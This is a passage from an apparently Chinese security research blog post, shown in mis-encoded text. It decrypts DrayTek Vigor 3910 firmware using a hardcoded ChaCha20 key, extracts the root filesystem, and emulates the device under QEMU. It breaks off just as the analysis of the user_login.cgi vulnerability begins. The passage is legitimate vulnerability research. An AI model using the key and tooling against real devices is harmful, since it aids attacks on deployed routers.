class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(dec_data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python3 %s &lt;enc_Image&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    do_decrypt(filename)</span><br></pre></td></tr></table></figure></div>

<p>è§£å¯†ä¹‹åå¾—åˆ° ARM64 Linux boot Imageï¼Œæ£€æŸ¥å…¶ç†µå€¼</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-6.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>enc_Image_decrypted.bin çš„ç†µå€¼</em></td>
</tr>
</tbody></table>
<p>ç†µå€¼æœ‰å˜åŒ–ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹åˆ†æç»“æœå‘ç°ï¼ŒLinux æ–‡ä»¶ç³»ç»Ÿæ˜¯ä»¥ cpio å½¢å¼åµŒå…¥åˆ°å†…æ ¸ä¸­çš„ï¼Œbinwalk æ— æ³•ç›´æ¥è§£åŒ…ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è¿˜è¦å¯¹å†…æ ¸è¿›è¡Œåˆ†æï¼Œå°è¯•è§£å‹ cpio æ–‡ä»¶ã€‚</p>
<p>é€†å‘åˆ†æå†…æ ¸ï¼Œé€šè¿‡æœç´¢å­—ç¬¦ä¸²æ‰¾åˆ° sub_991C1C å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_991C1C</span><span class="params">(_BYTE *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  qword_9CFAA8 = sub_14DA30(qword_34BCB60, <span class="number">0x24000C0</span>i64);</span><br><span class="line">  qword_9CFB60 = sub_11AF70(<span class="number">0x2003</span>i64, <span class="number">0x24000C0</span>, <span class="number">2u</span>);</span><br><span class="line">  v4 = sub_14DA30(qword_34BCB90, <span class="number">0x24000C0</span>i64);</span><br><span class="line">  qword_9CFB68 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_9CFAA8 || (qword_9CFB60 ? (v5 = v4 == <span class="number">0</span>) : (v5 = <span class="number">1</span>), v5) )</span><br><span class="line">    sub_F312C(aCanTAllocateBu_1);               <span class="comment">// can&#x27;t allocate buffers</span></span><br><span class="line">  qword_9CFA60 = <span class="number">0</span>i64;</span><br><span class="line">  qword_9CFA80 = <span class="number">0</span>i64;</span><br><span class="line">  dword_9CFA88 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !qword_9CFA60 &amp;&amp; a2 != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = qword_9CFA80;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">0x30</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (qword_9CFA80 &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      dword_9CFA88 = <span class="number">0</span>;</span><br><span class="line">      v8 = sub_991558(a1, a2);</span><br><span class="line">      a1 += v8;</span><br><span class="line">      a2 -= v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_18:</span><br><span class="line">      qword_9CFA80 = <span class="number">0</span>i64;</span><br><span class="line">      v9 = sub_9AE094(a1, a2, &amp;v18);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9(a1, a2, <span class="number">0</span>i64, sub_9915A8, <span class="number">0</span>i64, &amp;qword_34A5078, error) )</span><br><span class="line">          error(aDecompressorFa);               <span class="comment">// decompressor failed</span></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»£ç ä¸­åŒ…å« <code>decompressor failed</code> ç­‰æç¤ºï¼Œä¼¼ä¹å’Œè§£å‹æ•°æ®ç›¸å…³ï¼Œå¯¹ sub_991C1C å‡½æ•°è¿›è¡Œäº¤å‰å¼•ç”¨å®šä½åˆ°ä»¥ä¸‹ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_991F9C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_991C1C(compressed, qword_33EB2F0) )</span><br><span class="line">    sub_F312C(&amp;qword_8B3DC0);</span><br></pre></td></tr></table></figure></div>

<p>sub_991C1C å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å…¨å±€å˜é‡ï¼Œæ•°æ®ä»¥ 0x184C2102 å¼€å¤´ï¼Œè¿™æ˜¯ LZ4 å‹ç¼©çš„<a class="link"   href="https://android.googlesource.com/platform/external/lz4/+/HEAD/doc/lz4_Frame_format.md" >æ ‡å¿—<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚è€Œ qword_33EB2F0 å­˜æ”¾çš„å€¼ä¸º 0x2A0B6D6ï¼Œä¸ºå‹ç¼©æ•°æ®çš„é•¿åº¦ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ ¹æ®ä»¥ä¸Šå‚æ•°ä»å†…æ ¸ä¸­æå–å‡ºè¿™éƒ¨åˆ† lz4 å‹ç¼©çš„æ•°æ®ï¼Œç„¶åæ‰‹åŠ¨è§£å‹ã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=enc_Image_decrypted.bin of=lz4.bin bs=1 skip=10353688 count=44086998</span><br><span class="line">lz4 -d ./lz4.bin decompressed.bin</span><br></pre></td></tr></table></figure></div>

<p>æœ€ç»ˆå¾—åˆ°ä¸€ä¸ª cpio å‹ç¼©æ–‡æ¡£ï¼Œç›´æ¥ç”¨ cpio å‘½ä»¤è§£å‹ï¼Œè§£å‹åå³å¯çœ‹åˆ° Linux æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; ./decompressed.bin</span><br></pre></td></tr></table></figure></div>

<p>å°†ä»¥ä¸Šæµç¨‹ç¼–å†™ä»£ç å®ç°è‡ªåŠ¨åŒ–</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_decrypt</span>(<span class="params">nonce, enc_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Decrypt&quot;</span>)</span><br><span class="line">    key = <span class="string">b&quot;0DraytekKd5Eason3DraytekKd5Eason&quot;</span></span><br><span class="line">    cipher = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">    dec_data = cipher.decrypt(enc_data)</span><br><span class="line">    <span class="keyword">return</span> dec_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_enc_image</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Split enc_Image&quot;</span>)</span><br><span class="line">        model_len = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="number">0x40</span>:<span class="number">0x44</span>])[<span class="number">0</span>]</span><br><span class="line">        model = data[<span class="number">0x44</span>: <span class="number">0x44</span> + model_len]</span><br><span class="line">        <span class="keyword">if</span> model != <span class="string">b&quot;v3910&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error: invalid file&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        _tmp = data.find(<span class="string">b&quot;nonce&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> _tmp == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error: invalid file&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        nonce = data[_tmp + <span class="number">9</span>: _tmp + <span class="number">9</span> + <span class="number">0xC</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] nonce: %s&quot;</span> % nonce.decode())</span><br><span class="line"></span><br><span class="line">        enc_image_start = data.find(<span class="string">b&quot;enc_Image&quot;</span>)</span><br><span class="line">        enc_image_len = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[enc_image_start + <span class="number">9</span>: enc_image_start + <span class="number">9</span> + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        enc_data = data[enc_image_start + <span class="number">13</span>: enc_image_start + <span class="number">13</span> + enc_image_len]</span><br><span class="line">        <span class="keyword">return</span> (nonce, enc_data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: split_enc_image&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_lz4_image</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:    <span class="comment"># hexacon_draytek_2022_final</span></span><br><span class="line">        start = data.find(<span class="string">b&quot;\x02\x21\x4C\x18&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error: no lz4 header&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        end = data.find(<span class="string">b&quot;R!!!&quot;</span>, start)</span><br><span class="line">        tmp_end = end</span><br><span class="line">        <span class="keyword">while</span> tmp_end != -<span class="number">1</span>:</span><br><span class="line">            end = tmp_end</span><br><span class="line">            tmp_end = data.find(<span class="string">b&quot;R!!!&quot;</span>, end + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> end == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error: no trailer&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        end += (<span class="number">0x14</span> - <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">return</span> data[start: end]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: split_lz4_image&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&quot;lz4 -d ./temp.bin ./rootfs.cpio&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&quot;./temp.bin&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: decompress&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Usage: python3 %s &lt;firmware&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    </span><br><span class="line">    nonce, enc_data = split_enc_image(data)</span><br><span class="line">    dec_data = do_decrypt(nonce, enc_data)</span><br><span class="line">    lz4_data = split_lz4_image(dec_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;temp.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(lz4_data)</span><br><span class="line">    decompress()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Saved to ./rootfs.cpio&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="æ¨¡æ‹Ÿæ‰§è¡Œ"><a href="#æ¨¡æ‹Ÿæ‰§è¡Œ" class="headerlink" title="æ¨¡æ‹Ÿæ‰§è¡Œ"></a>æ¨¡æ‹Ÿæ‰§è¡Œ</h2><p>3910 è®¾å¤‡ä¸Šè¿è¡Œäº†ä¸€ä¸ª Linux ç³»ç»Ÿï¼Œä½†ä¸»è¦çš„ä¸šåŠ¡é€»è¾‘éƒ½ä½äº qemu å¯åŠ¨çš„ sohod64.bin ä¸­ï¼Œå³ç„¶æ˜¯ QEMU å¯åŠ¨ï¼Œç†è®ºä¸Šä¹Ÿå¯ä»¥åœ¨æœ¬åœ°è¿è¡Œèµ·æ¥ã€‚</p>
<p>æ ¹æ®å‚è€ƒæ–‡ç« ï¼Œæ£€æŸ¥ firmware ç›®å½•ä¸‹çš„å¯åŠ¨è„šæœ¬ï¼Œå‘ç° qemu å¯åŠ¨æ—¶å­˜åœ¨ä¸€ä¸ªéæ ‡å‡†å‚æ•° <code>-dtb DrayTek</code>ï¼ŒçŒœæµ‹æ˜¯å¼€å‘è€…ä¿®æ”¹è¿‡ QEMU æºä»£ç ï¼Œè‡ªè¡Œæ·»åŠ çš„å‚æ•°ã€‚</p>
<p>Draytek æä¾›è®¾å¤‡çš„ GPL <a class="link"   href="https://gplsource.draytek.com/?dir=" >ä»£ç <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œä¸‹è½½ 3910 å‹å·çš„ GPL ä»£ç åˆ†æç¡®å®šï¼Œå¼€å‘è€…ä¸º QEMU æ·»åŠ äº†ä¸€äº›æ–°åŠŸèƒ½ï¼Œç”¨æ¥æ”¯æŒ drayos è¿è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç¼–è¯‘è¿™ä»½ GPL ä»£ç ã€‚</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">./configure --enable-kvm --enable-debug --target-list=aarch64-softmmu</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>

<p>ç¼–è¯‘å¥½ä¹‹åå¾—åˆ°éœ€è¦çš„ qemu-system-aarch64ï¼Œæ¥ä¸‹æ¥è¦ä¿®æ”¹åŸå§‹çš„å¯åŠ¨è„šæœ¬ï¼Œé€‚é…æœ¬åœ°ç¯å¢ƒã€‚</p>
<p>å®¿ä¸»æœºéœ€è¦æ–°æ·»åŠ ä¸¤å¼ ç½‘å¡ï¼Œä¿®æ”¹ network.sh è„šæœ¬ï¼Œå°†ç½‘å¡åç§°æ›¿æ¢åˆ°è„šæœ¬ä¸­</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">iflan=ens38</span><br><span class="line">ifwan=ens39</span><br><span class="line">mylanip=<span class="string">&quot;192.168.1.2&quot;</span></span><br><span class="line"></span><br><span class="line">brctl delbr br-lan</span><br><span class="line">brctl delbr br-wan</span><br><span class="line"></span><br><span class="line">ip <span class="built_in">link</span> add br-lan <span class="built_in">type</span> bridge</span><br><span class="line">ip tuntap add qemu-lan mode tap</span><br><span class="line">brctl addif br-lan <span class="variable">$iflan</span></span><br><span class="line">brctl addif br-lan qemu-lan</span><br><span class="line">ip addr flush dev <span class="variable">$iflan</span></span><br><span class="line">ifconfig br-lan <span class="variable">$mylanip</span></span><br><span class="line">ifconfig br-lan up</span><br><span class="line">ifconfig qemu-lan up</span><br><span class="line">ifconfig <span class="variable">$iflan</span> up</span><br><span class="line"></span><br><span class="line">ip <span class="built_in">link</span> add br-wan <span class="built_in">type</span> bridge</span><br><span class="line">ip tuntap add qemu-wan mode tap</span><br><span class="line">brctl addif br-wan <span class="variable">$ifwan</span></span><br><span class="line">brctl addif br-wan qemu-wan</span><br><span class="line">ip addr flush dev <span class="variable">$ifwan</span></span><br><span class="line">ifconfig br-lan <span class="variable">$mylanip</span></span><br><span class="line">ifconfig br-wan up</span><br><span class="line">ifconfig qemu-wan up</span><br><span class="line">ifconfig <span class="variable">$ifwan</span> up</span><br><span class="line"></span><br><span class="line">brctl show</span><br><span class="line"></span><br><span class="line"><span class="comment">#for speed test</span></span><br><span class="line">ethtool -K <span class="variable">$iflan</span> gro off</span><br><span class="line">ethtool -K <span class="variable">$iflan</span> gso off</span><br><span class="line"></span><br><span class="line">ethtool -K <span class="variable">$ifwan</span> gro off</span><br><span class="line">ethtool -K <span class="variable">$ifwan</span> gso off</span><br><span class="line"></span><br><span class="line">ethtool -K qemu-lan gro off</span><br><span class="line">ethtool -K qemu-lan gso off</span><br><span class="line"></span><br><span class="line">ethtool -K qemu-wan gro off</span><br><span class="line">ethtool -K qemu-wan gso off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#for telnet from linux to drayos 192.168.1.1</span></span><br><span class="line">ethtool -K br-lan tx off</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åæ„é€ å¯åŠ¨è„šæœ¬ï¼Œé¦–å…ˆæŒ‰ç…§å‚è€ƒæ–‡ç« çš„æç¤ºï¼Œä¿®æ”¹è‡ªå¸¦çš„å¯åŠ¨è„šæœ¬ï¼Œå½“å°è¯•å¯åŠ¨æ–‡ä¸­æåˆ°çš„ç‰ˆæœ¬(4.3.1)æ—¶ä¸€åˆ‡æ­£å¸¸ï¼Œä½†å¯åŠ¨æ–°ç‰ˆæ—¶ä¼šå‡ºç°é”™è¯¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[qemu_ivshmem_write_internal:2729] already wait for more than 100ms, check host.</span><br><span class="line"></span><br><span class="line">## Drv software rebooting : cmd=1, fun=check_max_portmap_sessions, line=31874 ##</span><br><span class="line"></span><br><span class="line"> dump_backtrace: fp:0x467ffe60, pc:0x4064fc48</span><br><span class="line">Call trace: 0x4064fc48 0x406fac58 0x404757a8 0x407bb120 0x407dfec4 0x406fbe84 0x406fb304 0x406fb250 0x40000c08 0x40000078 0x40000040</span><br><span class="line">reboot handler not init yet</span><br><span class="line">Init MAX session 300000 </span><br><span class="line">portmap addr_range 0x1c9c380 &gt; exmem_portmap_end_addr 0x0</span><br><span class="line"></span><br><span class="line"> !!! NULL, malloc Portmap memory fail</span><br><span class="line"> dray_nat_allocate_memory : malloc memory fail</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡é€†å‘åˆ†æå‘ç°å’Œ portmap å†…å­˜æœ‰å…³ç³»ï¼Œè€Œè¿™å—å†…å­˜åˆå’Œå‚æ•° memsize æœ‰å…³ï¼Œå› æ­¤å°è¯•å°† memsize å€¼ä¿®æ”¹ä¸º 1</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 1. do &quot;fw_setenv purelinux 1&quot; first , then reboot</span></span><br><span class="line"><span class="comment"># 2. do setup_qemu_linux.sh (default P3 as WAN, P4 as LAN, for both 1Gbps connection only)</span></span><br><span class="line"><span class="comment"># 3. remember to recover to normal mode by &quot;fw_setenv purelinux 0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">rangen</span></span>() &#123;</span><br><span class="line">   <span class="built_in">printf</span> <span class="string">&quot;%02x&quot;</span> `<span class="built_in">shuf</span> -i 1-255 -n 1`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">rangen1</span></span>() &#123;</span><br><span class="line">   <span class="built_in">printf</span> <span class="string">&quot;%x&quot;</span> `<span class="built_in">shuf</span> -i 1-15 -n 1`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">wan_mac</span></span>()&#123;</span><br><span class="line">        idx=<span class="variable">$1</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;%02x\n&quot;</span> $((<span class="number">0</span>x<span class="variable">$&#123;C&#125;</span>+<span class="number">0</span>x<span class="variable">$idx</span>)) | <span class="built_in">tail</span> -c 3 <span class="comment"># 3 = 2 digit + 1 terminating character</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A=$(rangen); B=$(rangen); C=$(rangen);</span><br><span class="line">LAN_MAC=<span class="string">&quot;00:1d:aa:<span class="variable">$&#123;A&#125;</span>:<span class="variable">$&#123;B&#125;</span>:<span class="variable">$&#123;C&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -p serial0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkfifo</span> serial0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -p serial1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkfifo</span> serial1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">platform_path=<span class="string">&quot;./platform&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;x86&quot;</span> &gt; <span class="variable">$platform_path</span></span><br><span class="line">enable_kvm_path=<span class="string">&quot;./enable_kvm&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;kvm&quot;</span> &gt; <span class="variable">$enable_kvm_path</span></span><br><span class="line"></span><br><span class="line">cfg_path=<span class="string">&quot;./magic_file&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;GCI_SKIP&quot;</span> &gt; gci_magic</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p ../data/uffs</span><br><span class="line"><span class="built_in">touch</span> ../data/uffs/v3910_ram_flash.bin</span><br><span class="line">uffs_flash=<span class="string">&quot;../data/uffs/v3910_ram_flash.bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &gt; memsize</span><br><span class="line"></span><br><span class="line">(<span class="built_in">sleep</span> 20 &amp;&amp; ethtool -K qemu-lan tx off) &amp;</span><br><span class="line"></span><br><span class="line">model=<span class="string">&quot;./model&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;3&quot;</span> &gt; ./model</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf ./app &amp;&amp; <span class="built_in">mkdir</span> -p ./app/gci</span><br><span class="line">GCI_PATH=<span class="string">&quot;./app/gci&quot;</span></span><br><span class="line">GCI_FAIL=<span class="string">&quot;./app/gci_exp_fail&quot;</span></span><br><span class="line">GDEF_FILE=<span class="string">&quot;<span class="variable">$GCI_PATH</span>/draycfg.def&quot;</span></span><br><span class="line">GEXP_FLAG=<span class="string">&quot;<span class="variable">$GCI_PATH</span>/EXP_FLAG&quot;</span></span><br><span class="line">GEXP_FILE=<span class="string">&quot;<span class="variable">$GCI_PATH</span>/draycfg.exp&quot;</span></span><br><span class="line">GDEF_FILE_ADDR=<span class="string">&quot;0x4de0000&quot;</span></span><br><span class="line">GEXP_FLAG_ADDR=<span class="string">&quot;0x55e0000&quot;</span></span><br><span class="line">GEXP_FILE_ADDR=<span class="string">&quot;0x55e0010&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;0#&quot;</span> &gt; <span class="variable">$GEXP_FLAG</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;19831026&quot;</span> &gt; <span class="variable">$GEXP_FILE</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;GCI_SKIP&quot;</span> &gt; <span class="variable">$GDEF_FILE</span></span><br><span class="line"></span><br><span class="line">SHM_SIZE=16777216</span><br><span class="line">./qemu-system-aarch64 -M virt,gic_version=3 -cpu cortex-a57 -m 1024 -L ../usr/share/qemu \</span><br><span class="line">           -kernel ./vqemu/sohod64.bin <span class="variable">$serial_option</span> -dtb DrayTek \</span><br><span class="line">           -nographic <span class="variable">$gdb_serial_option</span> <span class="variable">$gdb_remote_option</span> \</span><br><span class="line">           -device virtio-net-pci,netdev=network-lan,mac=<span class="variable">$&#123;LAN_MAC&#125;</span> \</span><br><span class="line">           -netdev tap,<span class="built_in">id</span>=network-lan,ifname=qemu-lan,script=no,downscript=no \</span><br><span class="line">           -device virtio-net-pci,netdev=network-wan,mac=00:1d:aa:<span class="variable">$&#123;A&#125;</span>:<span class="variable">$&#123;B&#125;</span>:$(wan_mac 1) \</span><br><span class="line">           -netdev tap,<span class="built_in">id</span>=network-wan,ifname=qemu-wan,script=no,downscript=no \</span><br><span class="line">           -device virtio-serial-pci -chardev pipe,<span class="built_in">id</span>=ch0,path=serial0 \</span><br><span class="line">           -device virtserialport,chardev=ch0,name=serial0 \</span><br><span class="line">           -device loader,file=<span class="variable">$platform_path</span>,addr=0x25fff0 \</span><br><span class="line">           -device loader,file=<span class="variable">$cfg_path</span>,addr=0x260000 \</span><br><span class="line">           -device loader,file=<span class="variable">$uffs_flash</span>,addr=0x00be0000 \</span><br><span class="line">           -device loader,file=<span class="variable">$enable_kvm_path</span>,addr=0x25ffe0 \</span><br><span class="line">           -device loader,file=memsize,addr=0x25ff67 \</span><br><span class="line">	        -device loader,file=<span class="variable">$model</span>,addr=0x25ff69 \</span><br><span class="line">           -device loader,file=<span class="variable">$GDEF_FILE</span>,addr=<span class="variable">$GDEF_FILE_ADDR</span> \</span><br><span class="line">           -device loader,file=<span class="variable">$GEXP_FLAG</span>,addr=<span class="variable">$GEXP_FLAG_ADDR</span> \</span><br><span class="line">           -device loader,file=<span class="variable">$GEXP_FILE</span>,addr=<span class="variable">$GEXP_FILE_ADDR</span> \</span><br><span class="line">           -device nec-usb-xhci,<span class="built_in">id</span>=usb \</span><br><span class="line">           -device ivshmem-plain,memdev=hostmem \</span><br><span class="line">           -object memory-backend-file,size=<span class="variable">$&#123;SHM_SIZE&#125;</span>,share,mem-path=/dev/shm/ivshmem,<span class="built_in">id</span>=hostmem</span><br></pre></td></tr></table></figure></div>

<p>å¯åŠ¨æ—¶å…ˆæ‰§è¡Œ network.shï¼Œéšåæ‰§è¡Œ myrun.shï¼Œè®¿é—® 192.168.1.1 å³å¯çœ‹åˆ°ç™»å½•é¡µé¢</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-7.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>ç³»ç»ŸæˆåŠŸå¯åŠ¨</em></td>
</tr>
</tbody></table>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ ¹æ®æè¿°ï¼Œæ¼æ´å‡ºç°åœ¨ user_login.cgi ä¸­ï¼Œåœ¨ soho64.bin æœç´¢è¯¥å­—ç¬¦ä¸²ï¼Œç»“æœä¸­æœ‰ä¸€ä¸ªåœ°å€æ‰¾ä¸åˆ°ä»»ä½•å¼•ç”¨ï¼Œåœ¨ç¨‹åºä¸­æœç´¢è¯¥å­—ç¬¦ä¸²çš„åœ°å€å¯ä»¥æ‰¾åˆ° IDA æœªè¯†åˆ«çš„ä½ç½®ï¼Œæ­¤å¤„å­˜åœ¨å¤§é‡ URI -&gt; handler çš„æ˜ å°„å…³ç³»ï¼Œå› æ­¤ä¹Ÿèƒ½æ‰¾åˆ° user_login.cgi çš„ handlerï¼Œå…¶ä¸­å…³é”®ä»£ç å¦‚ä¸‹</p>
